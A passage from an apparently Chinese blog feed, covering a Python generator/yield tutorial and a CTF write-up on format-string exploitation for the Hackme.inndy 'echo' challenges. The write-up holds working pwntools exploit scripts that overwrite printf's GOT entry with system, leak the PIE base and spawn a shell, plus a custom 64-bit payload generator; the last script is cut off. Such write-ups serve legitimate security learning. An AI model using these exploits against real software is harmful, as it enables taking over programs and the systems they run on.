class="line">    <span class="keyword">while</span> n &lt; max: </span><br><span class="line">        <span class="keyword">print</span> b </span><br><span class="line">        a, b = b, a + b </span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line">fab(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>该方法是常规方法，通过在函数里面调用<code>print b</code>来实现打印。</p><p>但是该方法<strong>可复用性较差，因为 fab 函数返回 None，其他函数无法获得该函数生成的数列。</strong></p><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p><strong>要提高 fab 函数的可复用性，最好不要直接打印出数列，而是返回一个 List。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fab</span><span class="params">(max)</span>:</span> </span><br><span class="line">    n, a, b = <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span> </span><br><span class="line">    L = [] </span><br><span class="line">    <span class="keyword">while</span> n &lt; max: </span><br><span class="line">        L.append(b) </span><br><span class="line">        a, b = b, a + b </span><br><span class="line">        n = n + <span class="number">1</span> </span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> fab(<span class="number">5</span>): </span><br><span class="line">    <span class="keyword">print</span> n</span><br></pre></td></tr></table></figure><p>该方法<strong>能满足复用性的要求</strong>，但该函数在运行中占用的内存会随着参数 max 的增大而增大，如果要<strong>控制内存占用</strong>，最好不要用 List来保存中间结果，而是通过 iterable 对象来迭代。</p><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>): <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><code>range()方法</code>会导致生成一个 1000 个元素的 List。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1000</span>): <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><code>xrange()方法</code>则不会生成一个 1000 个元素的 List，而是在每次迭代中返回下一个数值，内存空间占用很小。因为 xrange 不返回 List，而是返回一个 iterable 对象。</p><h1 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fab</span><span class="params">(object)</span>:</span> </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, max)</span>:</span> </span><br><span class="line">        self.max = max </span><br><span class="line">        self.n, self.a, self.b = <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span> </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span> </span><br><span class="line">        <span class="keyword">return</span> self </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span> </span><br><span class="line">        <span class="keyword">if</span> self.n &lt; self.max: </span><br><span class="line">            r = self.b </span><br><span class="line">            self.a, self.b = self.b, self.a + self.b </span><br><span class="line">            self.n = self.n + <span class="number">1</span> </span><br><span class="line">            <span class="keyword">return</span> r </span><br><span class="line">        <span class="keyword">raise</span> StopIteration()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> Fab(<span class="number">5</span>): </span><br><span class="line">    <span class="keyword">print</span> n</span><br></pre></td></tr></table></figure><p>Fab 类通过 next() 不断返回数列的下一个数，内存占用始终为<code>常数</code>，但是这种方法的代码不够简洁。</p><h1 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h1><p>如果我们想要保持第一版 fab 函数的<code>简洁性</code>，同时又要获得<code>iterable 的效果</code>，yield 就派上用场了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fab</span><span class="params">(max)</span>:</span> </span><br><span class="line">    n, a, b = <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span> </span><br><span class="line">    <span class="keyword">while</span> n &lt; max: </span><br><span class="line">        <span class="keyword">yield</span> b      <span class="comment"># 使用 yield</span></span><br><span class="line">        <span class="comment"># print b </span></span><br><span class="line">        a, b = b, a + b </span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> fab(<span class="number">5</span>): </span><br><span class="line">    <span class="keyword">print</span> n</span><br></pre></td></tr></table></figure><p>简单地讲，<code>yield</code> 的作用就是把一个函数变成一个 <code>generator(生成器)</code>，带有 <code>yield</code> 的函数不再是一个普通函数，Python 解释器会将其视为一个 <code>generator</code>，调用 <code>fab(5)</code> 不会执行 <code>fab</code> 函数，而是返回一个<code>iterable</code> 对象！在 for 循环执行时，每次循环都会执行 <code>fab 函数</code>内部的代码，执行到<code>yield b</code>时，fab 函数就返回一个迭代值，下次迭代时，代码从 <code>yield b</code> 的下一条语句继续执行，而函数的本地变量看起来和上次中断执行前是完全一样的，于是函数继续执行，直到再次遇到<code>yield</code>。</p><p>也可以手动调用 fab(5) 的 next() 方法（因为<code>fab(5)</code>是一个<code>generator 对象</code>，该对象具有<code>next()</code>方法），这样我们就可以更清楚地看到 fab 的执行流程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;f = fab(<span class="number">5</span>) </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.next() </span><br><span class="line"><span class="number">1</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.next() </span><br><span class="line"><span class="number">1</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.next() </span><br><span class="line"><span class="number">2</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.next() </span><br><span class="line"><span class="number">3</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.next() </span><br><span class="line"><span class="number">5</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.next() </span><br><span class="line">Traceback (most recent call last): </span><br><span class="line"> File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt; </span><br><span class="line">StopIteration</span><br></pre></td></tr></table></figure><hr><p>在一个 generator function 中，如果没有 return，则默认执行至函数完毕，如果在执行过程中 return，则直接抛出 StopIteration 终止迭代。</p><p>示例:</p><p>如果直接对文件对象调用 read() 方法，会导致不可预测的内存占用。好的方法是利用固定长度的缓冲区来不断读取文件内容。通过 yield，我们不再需要编写读文件的迭代类，就可以轻松实现文件读取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(fpath)</span>:</span> </span><br><span class="line">    BLOCK_SIZE = <span class="number">1024</span> </span><br><span class="line">    <span class="keyword">with</span> open(fpath, <span class="string">'rb'</span>) <span class="keyword">as</span> f: </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">            block = f.read(BLOCK_SIZE) </span><br><span class="line">            <span class="keyword">if</span> block: </span><br><span class="line">                <span class="keyword">yield</span> block </span><br><span class="line">            <span class="keyword">else</span>: </span><br><span class="line">                <span class="keyword">return</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.ibm.com/developerworks/cn/opensource/os-cn-python-yield/" target="_blank" rel="noopener">参考链接</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/902690.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="随手小记" scheme="http://liul14n.top/categories/%E9%9A%8F%E6%89%8B%E5%B0%8F%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>[Hackme.inndy]echo/echo2/echo3</title>
    <link href="http://liul14n.top/2020/03/16/Hackme-inndy-echo-echo2-echo3/"/>
    <id>http://liul14n.top/2020/03/16/Hackme-inndy-echo-echo2-echo3/</id>
    <published>2020-03-16T11:11:44.000Z</published>
    <updated>2022-01-07T06:37:49.371Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/72707136_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>通过三道格式化字符串的题目学习巩固格式化字符串漏洞的利用</strong></p><p>这是[Hackme.inndy]的题目，在BUUOJ上也能找得到。</p><p>做这三道题目用了不少时间，仔细想想，还是因为最开始学格式化字符串的时候没学扎实，漏了挺多细节，导致题目打不通。</p><p>不过虽然用了不少时间，但是收获还是非常多的。</p><h1 id="0x01-echo"><a href="#0x01-echo" class="headerlink" title="0x01 echo"></a>0x01 echo</h1><p>这是三道题目里面最简单的一道。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/image-20200317004722413.png" alt></p><p>很明显存在格式化字符串漏洞。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>由于是32位程序，可以直接利用pwntools的<code>fmtstr_payload</code>模块构造payload，覆盖<code>printf_got</code>为<code>system_plt</code>，然后<code>sendline(&#39;/bin/sh&#39;)</code>即可</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./echo')</span></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29729</span>)</span><br><span class="line">elf = ELF(<span class="string">'./echo'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system = elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;printf:system&#125;)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x02-echo2"><a href="#0x02-echo2" class="headerlink" title="0x02 echo2"></a>0x02 echo2</h1><p>这道题相比第一道要有些难度了。</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>可以看到程序开启了PIE且是64位程序。</p><p>所以要先泄露程序真正的加载地址，然后再覆盖<code>printf_got</code>为<code>system_plt</code>。</p><p>不过这里不能再用pwntools的<code>fmtstr_payload</code>模块了,因为64位程序的地址容易出现’\x00’造成截断。</p><h2 id="Do-it！"><a href="#Do-it！" class="headerlink" title="Do it！"></a>Do it！</h2><h3 id="泄露程序加载地址"><a href="#泄露程序加载地址" class="headerlink" title="泄露程序加载地址"></a>泄露程序加载地址</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010304.png" alt></p><p>可以在IDA中看到<code>call printf</code>的地址为0x984，这是相对偏移，gdb下断在此处然后查看栈的情况如下:</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010441.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010524.png" alt></p><p>能够看到<code>0x7fffffffde48</code>存放着<code>main+74</code>，<code>0x7fffffffde58</code>存放着<code>__libc_start_main+240</code></p><p>调试可以知道这两处分别对应<code>%41$p</code>、<code>%43$p</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200317010913.png" alt></p><p>通过pie命令可以知道程序加载基址为<code>0x555555554000</code>，这和我们的main+74正好相差0xa03，由此可以泄露出程序加载基址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'%41$p---'</span> + <span class="string">'%43$p...'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">elfbase  = int(c.recvuntil(<span class="string">'---'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0xa03</span></span><br><span class="line">l_s_m_addr = int(c.recvuntil(<span class="string">'...'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',l_s_m_addr)</span></span><br><span class="line"><span class="comment">#libcbase = l_s_m_addr - libc.dump('__libc_start_main')</span></span><br><span class="line"></span><br><span class="line">system = elf.plt[<span class="string">'system'</span>] + elfbase</span><br><span class="line"><span class="comment">#system = libcbase + libc.dump('system')</span></span><br><span class="line">printf = elf.got[<span class="string">'printf'</span>] + elfbase</span><br><span class="line">success(<span class="string">'printf = '</span> + hex(printf))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br></pre></td></tr></table></figure><p><strong>实际上只需要泄露出elfbase即可，但是大多数wp都同时泄露了__libc_start_main进而泄露libcbase，然后通过libcbase+libc.dump(‘system’)来得到system地址</strong></p><p>根据注释应该能看出来这是两种方法，通过测试这两种方法都是可以打通的</p><h3 id="构造payload-amp-getshell"><a href="#构造payload-amp-getshell" class="headerlink" title="构造payload&amp;getshell"></a>构造payload&amp;getshell</h3><p>这算是第一次接触64位的格式化字符串漏洞吧，之前打32位的时候一直用的<code>fmtstr_payload</code>,现在没法用它，感觉少了些什么。</p><p>第一次打的时候是手动构造的payload，但是懒惰成为了第一生产力，我在网上搜了两个64位的<code>fmtstr_payload</code>，其中一个完全不能用，还有一个这道题能用，但是别的题好像就不行了。放一下链接</p><p><a href="https://www.aloxaf.com/2018/07/hackme_inndy/#echo2" target="_blank" rel="noopener">这道题可用</a></p><p><a href="https://xz.aliyun.com/t/7110#toc-18" target="_blank" rel="noopener">完全打不通</a></p><p><strong>无奈只能仿照着这俩自己写了一个，虽然也是有一定的局限性，还可能有bug，但我测了好几组样例，都正常，当然还有一些地方可以优化，但是太懒了，就懒得鼓捣了。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmtstr_payload64</span><span class="params">(offset, src, data,type = <span class="string">'byte'</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    生成 64 位格式化字符串payload</span></span><br><span class="line"><span class="string">    offset: 偏移</span></span><br><span class="line"><span class="string">    src: 源地址</span></span><br><span class="line"><span class="string">    data: 欲写入内容</span></span><br><span class="line"><span class="string">    type: 目前只支持int、longlong、byte类型，默认为byte</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    data = hex(data).replace(<span class="string">'L'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> type == <span class="string">'int'</span>:</span><br><span class="line">        dataLen = <span class="number">8</span></span><br><span class="line">    <span class="keyword">elif</span> type == <span class="string">'longlong'</span>:</span><br><span class="line">        dataLen = <span class="number">16</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dataLen = len(data[<span class="number">2</span>:]) <span class="keyword">if</span> len(data[<span class="number">2</span>:])%<span class="number">2</span>==<span class="number">0</span> <span class="keyword">else</span> len(data[<span class="number">2</span>:])+<span class="number">1</span></span><br><span class="line">    x = (dataLen/<span class="number">2</span>)*<span class="number">12</span>/<span class="number">8</span> <span class="keyword">if</span> (dataLen/<span class="number">2</span>)*<span class="number">12</span>%<span class="number">8</span> == <span class="number">0</span> <span class="keyword">else</span> (dataLen/<span class="number">2</span>)*<span class="number">12</span>/<span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    data = data[<span class="number">2</span>:].rjust(<span class="number">16</span>,<span class="string">'0'</span>)</span><br><span class="line">    curNum = <span class="number">0</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index&lt;dataLen/<span class="number">2</span>:</span><br><span class="line">        num = data[<span class="number">-2</span>-(index*<span class="number">2</span>):] <span class="keyword">if</span> index == <span class="number">0</span> <span class="keyword">else</span> data[<span class="number">-2</span>-(index*<span class="number">2</span>):<span class="number">0</span>-(index*<span class="number">2</span>)]</span><br><span class="line">        num = int(num,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">            payload += <span class="string">'%'</span> + str(num) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">            curNum = num</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> num &lt;= (curNum&amp;<span class="number">0xff</span>):</span><br><span class="line">                payload += <span class="string">'%'</span> + str(num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> + <span class="number">1</span>) - curNum) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">                curNum = num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload += <span class="string">'%'</span> + str(num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span>) - curNum) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">                curNum = num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> )</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    payload = payload.ljust(<span class="number">8</span>*x,<span class="string">'a'</span>)</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index&lt;dataLen/<span class="number">2</span>:</span><br><span class="line">        payload += p64(src + index)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>然后覆盖就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload64(offset,printf,system)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmtstr_payload64</span><span class="params">(offset, src, data,type = <span class="string">'byte'</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    生成 64 位格式化字符串payload</span></span><br><span class="line"><span class="string">    offset: 偏移</span></span><br><span class="line"><span class="string">    src: 源地址</span></span><br><span class="line"><span class="string">    data: 欲写入内容</span></span><br><span class="line"><span class="string">    type: 目前只支持int、longlong、byte类型，默认为byte</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    data = hex(data).replace(<span class="string">'L'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> type == <span class="string">'int'</span>:</span><br><span class="line">        dataLen = <span class="number">8</span></span><br><span class="line">    <span class="keyword">elif</span> type == <span class="string">'longlong'</span>:</span><br><span class="line">        dataLen = <span class="number">16</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dataLen = len(data[<span class="number">2</span>:]) <span class="keyword">if</span> len(data[<span class="number">2</span>:])%<span class="number">2</span>==<span class="number">0</span> <span class="keyword">else</span> len(data[<span class="number">2</span>:])+<span class="number">1</span></span><br><span class="line">    x = (dataLen/<span class="number">2</span>)*<span class="number">12</span>/<span class="number">8</span> <span class="keyword">if</span> (dataLen/<span class="number">2</span>)*<span class="number">12</span>%<span class="number">8</span> == <span class="number">0</span> <span class="keyword">else</span> (dataLen/<span class="number">2</span>)*<span class="number">12</span>/<span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    data = data[<span class="number">2</span>:].rjust(<span class="number">16</span>,<span class="string">'0'</span>)</span><br><span class="line">    curNum = <span class="number">0</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index&lt;dataLen/<span class="number">2</span>:</span><br><span class="line">        num = data[<span class="number">-2</span>-(index*<span class="number">2</span>):] <span class="keyword">if</span> index == <span class="number">0</span> <span class="keyword">else</span> data[<span class="number">-2</span>-(index*<span class="number">2</span>):<span class="number">0</span>-(index*<span class="number">2</span>)]</span><br><span class="line">        num = int(num,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">            payload += <span class="string">'%'</span> + str(num) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">            curNum = num</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> num &lt;= (curNum&amp;<span class="number">0xff</span>):</span><br><span class="line">                payload += <span class="string">'%'</span> + str(num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> + <span class="number">1</span>) - curNum) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">                curNum = num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload += <span class="string">'%'</span> + str(num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span>) - curNum) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">                curNum = num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> )</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    payload = payload.ljust(<span class="number">8</span>*x,<span class="string">'a'</span>)</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index&lt;dataLen/<span class="number">2</span>:</span><br><span class="line">        payload += p64(src + index)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./echo2')</span></span><br><span class="line">elf = ELF(<span class="string">'./echo2'</span>)</span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28145</span>)</span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%41$p---'</span> + <span class="string">'%43$p...'</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line">elfbase  = int(c.recvuntil(<span class="string">'---'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span 